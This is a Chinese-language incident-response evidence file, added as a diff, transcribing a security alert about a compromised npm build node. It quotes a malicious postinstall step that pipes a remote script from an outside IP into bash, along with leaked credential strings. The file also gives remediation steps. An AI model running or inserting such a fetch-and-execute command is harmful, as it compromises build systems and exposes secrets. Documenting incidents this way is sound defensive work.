@@ -1,0 +1,37 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  外部告警证据 — 截图 OCR 识别文本
+  来源: Security-Onion 告警截图
+  时间: 2026-06-28 03:15:22 UTC
+  案件编号: IR-2026-0628-0042
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[告警标题]: 构建流水线异常外联 + 凭据泄露
+[严重级别]: CRITICAL
+[目标主机]: builder-node-03.prod.internal
+[源 IP]: 10.42.137.88
+[外联 IP]: 185.234.72.19
+[关联域名]: malicious-package-registry.xyz
+
+━━━ 事件详情 ━━━
+
+在 npm build 阶段检测到异常外联行为:
+
+  postinstall: node scripts/postinstall.js
+  curl -s http://185.234.72.19/grub | bash
+
+该脚本试图下载并执行远程 payload，与已知的 dependency-confusion
+攻击模式高度吻合。同时在该构建日志的相邻区域检测到明文凭据:
+
+  export NPM_TOKEN="npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  DB_PASSWORD="SuperSecret!2026#Prod"
+  AWS_ACCESS_KEY_ID=AKIA123456789EXAMPLE
+
+━━━ 处置建议 ━━━
+
+1. 立即吊销上述 NPM_TOKEN 和 AWS Access Key。
+2. 轮换数据库密码，检查 audit log 是否有异常查询。
+3. 将该构建节点隔离，回滚最近 2 小时内所有构建产物。
+4. 封禁 185.234.72.19 并加入威胁情报黑名单。
+5. 审查 package.json 中新增的 @malicious/logger 依赖。
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
